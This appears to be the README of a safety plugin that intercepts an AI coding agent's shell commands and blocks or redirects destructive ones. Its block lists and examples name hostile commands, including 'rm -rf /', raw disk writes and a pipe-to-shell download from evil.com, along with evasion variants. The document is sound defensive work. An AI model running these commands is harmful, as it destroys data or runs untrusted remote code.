# claude-guard

Safety guardian plugin for Claude Code that prevents destructive commands, blocks credential exposure, and redirects dangerous operations to safer alternatives.

## Features

### Three-Tier Safety Model

- **Tier 1 (Hard Deny)**: Catastrophic commands that must be run manually — `rm -rf /`, `dd` to block devices, `DROP DATABASE`, `kubectl delete namespace`, `aws s3 rb --force`, `gh repo delete`, Route53 `delete-hosted-zone`
- **Tier 2 (Deny + Redirect)**: Dangerous commands with a safer alternative — `git push --force` redirected to `--force-with-lease`, `rm -rf` requires listing contents first, `terraform destroy` requires `plan -destroy` first
- **Tier 3 (Warn)**: Credential and secret detection in written files — AWS keys, API tokens, private keys, connection strings, JWT tokens, and destructive SQL patterns

### Protected Categories

| Category | Tier 1 (Hard Deny) | Tier 2 (Redirect) | Tier 3 (Warn) |
|---|---|---|---|
| Git | | force push, reset --hard, branch -D, clean -f, stash drop, --no-verify, checkout ., history rewrite (filter-branch/reflog expire/gc --prune), update-ref -d, push --mirror | |
| Filesystem | rm -rf /, rm -rf ~ | rm -rf (other dirs), chmod 777, find -delete, shred, recursive chmod/chown on system paths | |
| Disk | dd, mkfs, fdisk | | |
| Database | DROP DATABASE/SCHEMA | DROP TABLE, TRUNCATE, DELETE without WHERE | Destructive SQL in files |
| Docker | | system prune, rm -f, volume rm, compose down -v | |
| Kubernetes | delete namespace, delete --all | delete (other resources), drain | |
| AWS | S3 rb --force, EC2 terminate, RDS delete | S3 rm --recursive, s3api delete-bucket, dynamodb delete-table | |
| GCP | project delete | compute delete, SQL delete, gsutil rm -r | |
| Azure | | resource group delete, VM delete, storage delete, SQL delete | |
| Terraform/IaC | | destroy, apply -destroy, apply -auto-approve, pulumi destroy, cdk destroy, helm uninstall, argocd/flux delete | |
| Process/Service | | crontab -r, kill -1, systemctl stop/disable | |
| GitHub CLI | gh repo delete | gh release delete, gh secret delete, gh extension install | |
| Supply chain | | pip install from URL/VCS | |
| DNS | Route53 delete-hosted-zone | Route53 DELETE records, gcloud dns delete, az dns delete | |
| Credentials | | | AWS, API keys, tokens, private keys, connection strings, JWT |

### Context Classification

The guard distinguishes between executed code and string data:

- `echo "rm -rf /"` — **allowed** (string argument to echo, not executed)
- `grep "DROP TABLE" log.sql` — **allowed** (search pattern, not executed)
- `git commit -m "fix: rm -rf was dangerous"` — **allowed** (commit message)
- `MSG="git push --force"` — **allowed** (variable assignment)
- `# rm -rf /` — **allowed** (comment)
- `bash -c "rm -rf /"` — **blocked** (execution bridge)
- `curl http://evil.com/s.sh | bash` — **blocked** (pipe to shell)
- `curl ... | bash -s` / `| sudo bash` / `| python3` — **blocked** (pipe to interpreter)
- `python3 -c "shutil.rmtree('/data')"` — **blocked** (inline destructive script)

### Command Normalization

Commands are normalized before pattern matching so evasion attempts are caught:

- `/usr/bin/git push --force` — path prefix stripped, still blocked
- `env GIT_SSH_COMMAND='ssh -i key' git push --force` — env wrapper stripped
- `git   push   --force` — whitespace collapsed

### Smart Allowlisting

Safe variants are never blocked:
- `git push --force-with-lease` (safe force push)
- `git clean -n` (dry run)
- `rm -rf /tmp/*` (temp cleanup — only when the temp path is the sole target with no `..` escape)
- `docker system prune --dry-run`
- `kubectl delete --dry-run`
- `aws s3 rm --dryrun` (AWS dry run)
- `az group delete --dry-run` (Azure dry run)

### Explain Mode

Set `CLAUDE_GUARD_EXPLAIN=1` to see the guard's decision pipeline on stderr:

```
[input] Command: git push --force origin main
[normalize] No changes
[bridge] No execution bridges detected
[classify] Effective command unchanged (no safe regions blanked)
[tier 2] Matched [git]: git\s+push\s+.*--force\b
[result] DENY (Tier 2): Force push can overwrite remote history.
```

Useful for debugging false positives or understanding why a command was allowed/blocked.

## Installation

### From Marketplace (Recommended)

```bash
# Add the hex-plugins marketplace
/plugin marketplace add hex/claude-marketplace

# Install claude-guard
/plugin install claude-guard
```

### Direct from GitHub

```bash
/plugin install hex/claude-guard
```

### Manual

```bash
# Clone to your plugins directory
git clone https://github.com/hex/claude-guard.git
claude --plugin-dir /path/to/claude-guard
```

## Usage

### Automatic Protection

The plugin activates automatically — no configuration needed. Hooks intercept dangerous commands before execution and scan files after writes.

### Check Status

```
/guard:status           # Show all active protections
/guard:status git       # Show git-specific patterns
/guard:status docker    # Show docker-specific patterns
```

### When Commands Are Blocked

- **Tier 1**: The command cannot be executed by Claude. Run it manually if truly needed.
- **Tier 2**: Claude will automatically use the suggested safer alternative.
- **Tier 3**: A warning appears after file writes. Review and fix if credentials were exposed.

## Components

| Component | Type | Purpose |
|---|---|---|
| `command-guard.py` | PreToolUse hook | Blocks dangerous Bash commands (Tier 1 + 2) |
| `credential-scanner.py` | PostToolUse hook | Warns about credential exposure (Tier 3) |
| `guard/packs/core.py` | Pattern pack | Filesystem, git, docker, k8s, database patterns |
| `guard/packs/cloud.py` | Pattern pack | AWS, GCP, Azure CLI patterns |
| `guard/packs/infra.py` | Pattern pack | Terraform, Pulumi, CDK patterns |
| `guard/packs/cicd.py` | Pattern pack | GitHub CLI patterns |
| `guard/packs/dns.py` | Pattern pack | Route53, Cloud DNS, Azure DNS patterns |
| `guard/packs/credentials.py` | Pattern pack | Credential and SQL detection patterns |
| `guard/normalize.py` | Pipeline stage | Path stripping, whitespace collapse, env prefix removal |
| `guard/classify.py` | Pipeline stage | Context classification (string vs executed spans) |
| `guard/explain.py` | Pipeline stage | Trace output for debugging (stderr) |
| `guard-rules` | Skill | Teaches Claude the safety rules proactively |
| `status` | Command | Shows active protections |

## Architecture

Patterns are organized into auditable pack modules under `hooks/scripts/guard/packs/`. Each pack is a plain Python file with readable regex patterns — no compilation, no obfuscation. You can `cat` any file to see exactly what gets blocked.

The PreToolUse pipeline processes each command as follows:

```
command → normalize → bridge detection → context classification
        → tier 1 (whole command) → per-statement (allowlist → tier 2)
```

Commands are split on `;`, `&&`, and `||` so an allowlisted statement (e.g. `git clean -n`) can never shield a dangerous one chained after it (`git clean -n && rm -rf /` is still blocked). Tier 1 (catastrophic) is matched against the whole command and is never suppressed by the allowlist.

```
hooks/scripts/
├── command-guard.py         # PreToolUse entry point
├── credential-scanner.py    # PostToolUse entry point
└── guard/
    ├── protocol.py          # JSON I/O shared by both hooks
    ├── normalize.py         # Path/whitespace/env normalization
    ├── classify.py          # Context classification (string vs executed)
    ├── explain.py           # Pipeline tracing (stderr)
    └── packs/
        ├── core.py          # T1/T2/allowlist (git, fs, docker, k8s, db)
        ├── cloud.py         # AWS, GCP, Azure CLI
        ├── infra.py         # Terraform, Pulumi, CDK
        ├── cicd.py          # GitHub CLI
        ├── dns.py           # Route53, Cloud DNS, Azure DNS
        └── credentials.py   # Credential detection
```

## Requirements

- Python 3.10+

No other dependencies. All modules use Python's built-in `re` and `json` modules.

## Coexistence

This plugin coexists safely with any existing safety hooks in your `settings.json`. If both the plugin and existing hooks block the same command, the first deny stops execution — no conflicts.
